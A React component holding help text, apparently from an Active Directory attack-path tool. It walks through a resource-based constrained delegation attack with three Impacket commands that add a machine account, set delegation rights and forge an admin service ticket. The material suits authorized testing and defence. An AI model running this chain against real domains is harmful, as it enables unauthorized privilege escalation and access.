import React from 'react';

const LinuxAbuse = () => {
    return (
        <>
            First, if an attacker does not control an account with an
            SPN set, a new attacker-controlled computer account can be
            added with Impacket's addcomputer.py example script:
            <pre>
                <code>
                    {
                        "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"
                    }
                </code>
            </pre>
            We now need to configure the target object so that the attacker-controlled
            computer can delegate to it. Impacket's rbcd.py script can be used for that
            purpose:
            <pre>
                <code>
                    {
                        "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"
                    }
                </code>
            </pre>
            And finally we can get a service ticket for the service name (sname) we
            want to "pretend" to be "admin" for. Impacket's getST.py example script
            can be used for that purpose.
            <pre>
                <code>
                    {
                        "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"
                    }
                </code>
            </pre>
            This ticket can then be used with Pass-the-Ticket, and could grant access
            to the file system of the TARGETCOMPUTER.
        </>
    );
};

export default LinuxAbuse;
